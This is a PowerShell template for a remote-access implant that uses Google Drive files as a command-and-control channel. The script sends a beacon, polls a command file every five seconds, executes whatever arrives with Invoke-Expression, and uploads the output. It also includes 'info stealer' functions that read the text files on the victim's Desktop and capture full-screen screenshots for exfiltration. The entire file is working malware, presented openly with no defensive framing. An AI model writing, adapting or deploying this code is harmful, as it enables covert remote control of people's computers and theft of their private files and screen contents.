# ====================================================================
# template_drive.ps1 - Updated for C2 Sessions & Interactive Mode
# ====================================================================

_CLIENT_ID_PLACEHOLDER_
_CLIENT_SECRET_PLACEHOLDER_
_REFRESH_TOKEN_PLACEHOLDER_
_CMD_FILE_ID_PLACEHOLDER_
_RES_FILE_ID_PLACEHOLDER_

$AgentName = "Agent_" + (Get-Random -Minimum 1000 -Maximum 9999)

function Get-AccessToken {
    $Body = @{
        client_id     = $ClientID
        client_secret = $ClientSecret
        refresh_token = $RefreshToken
        grant_type    = "refresh_token"
    }
    try {
        $Response = Invoke-RestMethod -Uri "https://oauth2.googleapis.com/token" -Method Post -Body $Body
        return $Response.access_token
    } catch { return $null }
}

function Get-DriveFileContent ([string]$AccessToken, [string]$FileID) {
    $Headers = @{ "Authorization" = "Bearer $AccessToken" }
    $Uri = "https://www.googleapis.com/drive/v3/files/$($FileID)?alt=media"
    try {
        return Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
    } catch { return $null }
}

function Update-DriveFileContent ([string]$AccessToken, [string]$FileID, [string]$Content) {
    $Headers = @{ 
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "text/plain"
    }
    $Uri = "https://www.googleapis.com/upload/drive/v3/files/$($FileID)?uploadType=media"
    try {
        $Response = Invoke-RestMethod -Uri $Uri -Method Patch -Headers $Headers -Body $Content | Out-Null
        return $true
    } catch { return $false }
}

# INFO STEALER: Full Desktop File Enumeration & Content Extraction
function Invoke-DesktopFileStealer {
    $DesktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
    
    $AllFiles = Get-ChildItem -Path $DesktopPath -File -ErrorAction SilentlyContinue
    
    if ($AllFiles) {
        $Report = "[⚡] INFO STEALER - DESKTOP MAP & SYSTEM EVIDENCE:`n"
        $Report += "==================================================`n"
        $Report += "Total Files Found: $($AllFiles.Count)`n`n"
        
        foreach ($File in $AllFiles) {
            $Report += "[+] FILE NAME: $($File.Name)`n"
            $Report += "[+] SIZE     : $($File.Length) Bytes`n"
            $Report += "[+] EXTENSION: $($File.Extension)`n"
            
            if ($File.Extension -eq ".txt") {
                $Content = Get-Content -Path $File.FullName -Raw -ErrorAction SilentlyContinue
                if (-not [string]::IsNullOrWhiteSpace($Content)) {
                    $Report += "[+] CONTENT  :`n$Content`n"
                } else {
                    $Report += "[+] CONTENT  : (Empty File)`n"
                }
            }
            $Report += "--------------------------------------------------`n"
        }
        return $Report
    } else {
        return "[-] Info Stealer: Desktop is completely empty."
    }
}

# INFO STEALER: Live Desktop Screenshot Capture (Base64 Streamer)
function Invoke-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        
        $Graphics.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $Screen.Size)
        
        $MemoryStream = New-Object System.IO.MemoryStream
        $Bitmap.Save($MemoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $Bytes = $MemoryStream.ToArray()
        $Base64String = [Convert]::ToBase64String($Bytes)
        
        $Graphics.Dispose()
        $Bitmap.Dispose()
        $MemoryStream.Dispose()
        
        return "[📊] SCREENSHOT_DATA:$Base64String"
    } catch {
        return "[-] Error capturing screenshot: $_"
    }
}

$AccessToken = Get-AccessToken
if ($AccessToken) {
    $InitialBeacon = "[$AgentName] Hello Operator! New session initialized successfully."
    $Discard = Update-DriveFileContent -AccessToken $AccessToken -FileID $ResFileID -Content $InitialBeacon
}


while ($true) {
    $AccessToken = Get-AccessToken
    if ($AccessToken) {
        $Command = Get-DriveFileContent -AccessToken $AccessToken -FileID $CmdFileID
        
        if (-not [string]::IsNullOrWhiteSpace($Command) -and $Command.StartsWith("[$AgentName]")) {
            
            $CleanCmd = $Command -replace "^\[.*?\]\s*", ""
            $Result = ""
            
            try {
                $RawResult = Invoke-Expression $CleanCmd | Out-String
                
                $Result = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($RawResult))
                if ([string]::IsNullOrWhiteSpace($Result)) {
                    $Result = "[+] Command executed successfully (No output)."
                }
            } catch {
                $Result = "Error executing command: $_"
            }
            
            $FormattedLoot = "[$AgentName] `n$Result"
            
            $Uploaded = Update-DriveFileContent -AccessToken $AccessToken -FileID $ResFileID -Content $FormattedLoot
            if ($Uploaded) {
                $Discard = Update-DriveFileContent -AccessToken $AccessToken -FileID $CmdFileID -Content ""
            }
        }
    }
    Start-Sleep -Seconds 5
}
